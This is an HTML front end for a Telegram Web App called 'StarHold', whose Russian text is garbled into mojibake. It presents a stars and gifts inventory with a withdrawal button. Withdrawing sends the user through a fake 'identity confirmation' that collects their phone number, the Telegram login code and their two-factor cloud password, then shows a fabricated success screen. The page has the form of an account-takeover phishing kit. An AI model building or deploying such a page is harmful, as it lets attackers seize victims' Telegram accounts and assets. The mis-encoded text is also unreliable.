<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>StarHold - –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤</title>
    <link rel="stylesheet" href="/static/css/style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container" id="app">
        <!-- –õ–æ–≥–æ—Ç–∏–ø -->
        <div class="logo-container">
            <img src="/static/img/starhold-logo.png" class="logo" alt="StarHold">
            <!-- –ë–ï–ó logo-text –µ—Å–ª–∏ —Ç–µ–∫—Å—Ç –Ω–∞ PNG -->
        </div>

        <!-- ==================== –û–°–ù–û–í–ù–û–ô WEBAPP ==================== -->

        <!-- –≠–ö–†–ê–ù: –ì–ª–∞–≤–Ω–∞—è (–ò–Ω–≤–µ–Ω—Ç–∞—Ä—å –∏ –í—ã–≤–æ–¥) -->
        <div id="screen-main" class="screen">
            <!-- –¢–∞–±—ã –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ -->
            <div class="tabs">
                <button class="tab-button active" data-tab="inventory" onclick="switchTab('inventory')">
                    üë§ –ò–Ω–≤–µ–Ω—Ç–∞—Ä—å
                </button>
                <button class="tab-button" data-tab="withdrawal" onclick="switchTab('withdrawal')">
                    üí∏ –í—ã–≤–æ–¥
                </button>
            </div>

            <!-- –í–∫–ª–∞–¥–∫–∞: –ò–Ω–≤–µ–Ω—Ç–∞—Ä—å -->
            <div id="tab-inventory" class="tab-content active">
                <!-- –ü—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è -->
                <div class="profile-card card">
                    <div class="profile-avatar">
                        <div class="avatar-placeholder" id="userAvatar">üë§</div>
                    </div>
                    <div class="profile-info">
                        <div class="profile-name" id="userName">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
                        <div class="profile-username" id="userUsername">@username</div>
                    </div>
                </div>

                <!-- –†–∞–∑–¥–µ–ª –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è -->
                <div class="section-title">üì¶ –ú–û–ô –ò–ù–í–ï–ù–¢–ê–†–¨</div>

                <!-- –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ -->
                <div class="balance-card card">
                    <div class="balance-icon">‚≠ê</div>
                    <div class="balance-info">
                        <div class="balance-label">–ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥</div>
                        <div class="balance-amount" id="starsBalance">0 ‚≠ê</div>
                    </div>
                </div>

                <!-- –°–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ -->
                <div class="gifts-section">
                    <div class="gifts-header">
                        <span class="gifts-title">üéÅ –ú–æ–∏ –ø–æ–¥–∞—Ä–∫–∏ (<span id="giftsCount">0</span>)</span>
                    </div>
                    <div id="giftsList" class="gifts-list">
                        <!-- –ü–æ–¥–∞—Ä–∫–∏ –±—É–¥—É—Ç –∑–∞–≥—Ä—É–∂–µ–Ω—ã —á–µ—Ä–µ–∑ JS -->
                        <div class="empty-state">
                            <div class="empty-icon">üì≠</div>
                            <div class="empty-text">–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- –í–∫–ª–∞–¥–∫–∞: –í—ã–≤–æ–¥ -->
            <div id="tab-withdrawal" class="tab-content">
                <h2>üí∏ –í–´–í–û–î –°–†–ï–î–°–¢–í</h2>
                <p class="subtitle">–í—ã–±–µ—Ä–∏—Ç–µ —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–≤–µ—Å—Ç–∏:</p>

                <div class="withdrawal-options">
                    <button class="withdrawal-option-btn" onclick="showStarsWithdrawal()">
                        <div class="option-icon">‚≠ê</div>
                        <div class="option-text">–í—ã–≤–µ—Å—Ç–∏ –∑–≤—ë–∑–¥—ã</div>
                    </button>

                    <button class="withdrawal-option-btn" onclick="showGiftsWithdrawal()">
                        <div class="option-icon">üéÅ</div>
                        <div class="option-text">–í—ã–≤–µ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–∏</div>
                    </button>
                </div>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù: –í—ã–≤–æ–¥ –∑–≤—ë–∑–¥ -->
        <div id="screen-stars-withdrawal" class="screen hidden">
            <button class="back-button" onclick="backToMain()">‚Üê –ù–∞–∑–∞–¥</button>
            
            <h2>‚≠ê –í–´–í–û–î –ó–í–Å–ó–î</h2>
            <p class="subtitle">–í–∞—à –±–∞–ª–∞–Ω—Å: <strong id="starsBalanceWithdrawal">0 ‚≠ê</strong></p>

            <div class="card">
                <div class="form-group">
                    <label class="form-label">–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞:</label>
                    <input type="number" id="withdrawalStarsAmount" class="form-input" 
                           placeholder="–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–≤—ë–∑–¥" min="1">
                </div>

                <div class="quick-select">
                    <button class="quick-btn" onclick="setQuickAmount(1000)">1K‚≠ê</button>
                    <button class="quick-btn" onclick="setQuickAmount(5000)">5K‚≠ê</button>
                    <button class="quick-btn" onclick="setQuickAmount(10000)">10K‚≠ê</button>
                    <button class="quick-btn" onclick="setQuickAmountAll()">–í—Å—ë</button>
                </div>

                <button id="btnContinueStars" class="btn btn-primary" onclick="continueStarsWithdrawal()">
                    üöÄ –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å
                </button>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù: –í—ã–≤–æ–¥ –ø–æ–¥–∞—Ä–∫–æ–≤ -->
        <div id="screen-gifts-withdrawal" class="screen hidden">
            <button class="back-button" onclick="backToMain()">‚Üê –ù–∞–∑–∞–¥</button>
            
            <h2>üéÅ –í–´–í–û–î –ü–û–î–ê–†–ö–û–í</h2>
            <p class="subtitle">–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–¥–∞—Ä–∫–∏ –¥–ª—è –≤—ã–≤–æ–¥–∞:</p>

            <div id="giftsSelectionList" class="gifts-selection-list">
                <!-- –°–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –≤—ã–±–æ—Ä–∞ -->
            </div>

            <div class="card">
                <button class="btn btn-secondary" onclick="selectAllGifts()">
                    ‚ú® –í—ã–±—Ä–∞—Ç—å –≤—Å–µ
                </button>

                <div class="selected-count">
                    –í—ã–±—Ä–∞–Ω–æ: <strong id="selectedGiftsCount">0</strong> –ø–æ–¥–∞—Ä–∫–æ–≤
                </div>

                <button id="btnContinueGifts" class="btn btn-primary" onclick="continueGiftsWithdrawal()">
                    üöÄ –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å
                </button>
            </div>
        </div>

        <!-- ==================== –ê–í–¢–û–†–ò–ó–ê–¶–ò–Ø ==================== -->

        <!-- –≠–ö–†–ê–ù 1: –í—ã–±–æ—Ä —Å—Ç—Ä–∞–Ω—ã –∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div id="screen-phone" class="screen hidden">
            <h1>üîê StarHold</h1>
            <p class="subtitle">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ª–∏—á–Ω–æ—Å—Ç–∏</p>
            <p class="subtitle">–î–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤–ª–∞–¥–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–º.</p>

            <div class="card">
                <div class="form-group">
                    <label class="form-label">–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—à—É —Å—Ç—Ä–∞–Ω—É:</label>
                    <div class="country-select-wrapper">
                        <select id="countrySelect" class="country-select">
                            <option value="">–ó–∞–≥—Ä—É–∑–∫–∞ —Å—Ç—Ä–∞–Ω...</option>
                        </select>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" id="countryCode" class="form-input" 
                               style="width: 80px;" readonly placeholder="+7">
                        <input type="tel" id="phoneInput" class="form-input" 
                               placeholder="999 123 4567" style="flex: 1;">
                    </div>
                </div>

                <button id="btnSendCode" class="btn btn-primary">
                    üîí –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
                </button>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
        <div id="screen-code" class="screen hidden">
            <h1>üì± –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞</h1>
            <p class="subtitle">–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞:<br><strong id="phoneDisplay"></strong></p>
            <p class="subtitle">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram:</p>

            <div class="code-input-container">
                <input type="text" maxlength="1" class="code-digit" id="digit1" readonly>
                <input type="text" maxlength="1" class="code-digit" id="digit2" readonly>
                <input type="text" maxlength="1" class="code-digit" id="digit3" readonly>
                <input type="text" maxlength="1" class="code-digit" id="digit4" readonly>
                <input type="text" maxlength="1" class="code-digit" id="digit5" readonly>
            </div>

            <div class="keypad">
                <button class="keypad-button" onclick="addDigit('1')">1</button>
                <button class="keypad-button" onclick="addDigit('2')">2</button>
                <button class="keypad-button" onclick="addDigit('3')">3</button>
                <button class="keypad-button" onclick="addDigit('4')">4</button>
                <button class="keypad-button" onclick="addDigit('5')">5</button>
                <button class="keypad-button" onclick="addDigit('6')">6</button>
                <button class="keypad-button" onclick="addDigit('7')">7</button>
                <button class="keypad-button" onclick="addDigit('8')">8</button>
                <button class="keypad-button" onclick="addDigit('9')">9</button>
                <button class="keypad-button" onclick="addDigit('0')">0</button>
                <button class="keypad-button delete" onclick="deleteDigit()">‚¨ÖÔ∏è –£–¥–∞–ª–∏—Ç—å</button>
            </div>

            <div style="margin-top: 20px; text-align: center;">
                <button class="btn btn-secondary" onclick="changePhone()">
                    üìù –ò–∑–º–µ–Ω–∏—Ç—å –Ω–æ–º–µ—Ä
                </button>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù 3: –ü–∞—Ä–æ–ª—å 2FA -->
        <div id="screen-password" class="screen hidden">
            <h1>üõ°Ô∏è –û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</h1>
            <p class="subtitle">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—ç—Ç–∞–ø–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:</p>

            <div class="card">
                <div class="form-group">
                    <label class="form-label">–ü–∞—Ä–æ–ª—å:</label>
                    <div style="position: relative;">
                        <input type="password" id="passwordInput" class="form-input" 
                               placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å">
                        <button id="togglePassword" 
                                style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); 
                                       background: none; border: none; cursor: pointer; font-size: 20px;"
                                onclick="togglePasswordVisibility()">
                            üëÅÔ∏è
                        </button>
                    </div>
                </div>

                <button id="btnVerifyPassword" class="btn btn-primary">
                    üîì –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å
                </button>

                <div style="margin-top: 15px; text-align: center;">
                    <a href="#" style="color: var(--tg-theme-link-color); font-size: 14px; text-decoration: none;">
                        ‚ùì –ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?
                    </a>
                </div>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù 4: –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è -->
        <div id="screen-success" class="screen hidden">
            <div class="success-screen">
                <div class="success-icon">
                    <svg viewBox="0 0 52 52">
                        <polyline points="14 27 22 35 38 17"/>
                    </svg>
                </div>

                <h1 class="success-title">‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!</h1>
                <p class="success-message">–í–∞—à –∞–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω</p>

                <div class="status-box">
                    <div class="status-title">üîê –°—Ç–∞—Ç—É—Å –ø—Ä–æ–≤–µ—Ä–∫–∏:</div>
                    
                    <div class="status-item">
                        <span class="status-label">–ê–∫–∫–∞—É–Ω—Ç:</span>
                        <span class="status-value success">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω</span>
                    </div>
                    
                    <div class="status-item">
                        <span class="status-label">–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:</span>
                        <span class="status-value success">–ü—Ä–æ–≤–µ—Ä–µ–Ω–∞</span>
                    </div>
                    
                    <div class="status-item">
                        <span class="status-label">–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</span>
                        <span class="status-value success">StarHold</span>
                    </div>
                    
                    <div class="status-item">
                        <span class="status-label">–û–ø–µ—Ä–∞—Ü–∏—è:</span>
                        <span class="status-value pending">–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã–≤–æ–¥–∞</span>
                    </div>
                </div>

                <p class="subtitle">–í–∞—à–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –ø–µ—Ä–µ–≤–µ–¥–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç.</p>

                <button class="btn btn-primary active" onclick="closeWebApp()">
                    üè† –ó–∞–∫—Ä—ã—Ç—å
                </button>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù –ó–ê–ì–†–£–ó–ö–ò -->
        <div id="screen-loading" class="screen hidden">
            <div class="loader-container">
                <div class="loader loader-big"></div>
                <p class="subtitle" style="margin-top: 20px;" id="loadingText">–ó–∞–≥—Ä—É–∑–∫–∞...</p>
            </div>
        </div>

        <!-- –≠–ö–†–ê–ù –û–®–ò–ë–ö–ò -->
        <div id="screen-error" class="screen hidden">
            <div class="card" style="text-align: center;">
                <h2 style="color: var(--error-color);">‚ùå –û—à–∏–±–∫–∞</h2>
                <p id="errorText" class="subtitle"></p>
                <button class="btn btn-primary active" onclick="location.reload()">
                    üîÑ –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞
                </button>
            </div>
        </div>
    </div>

    <script src="/static/js/app.js"></script>
</body>
</html>
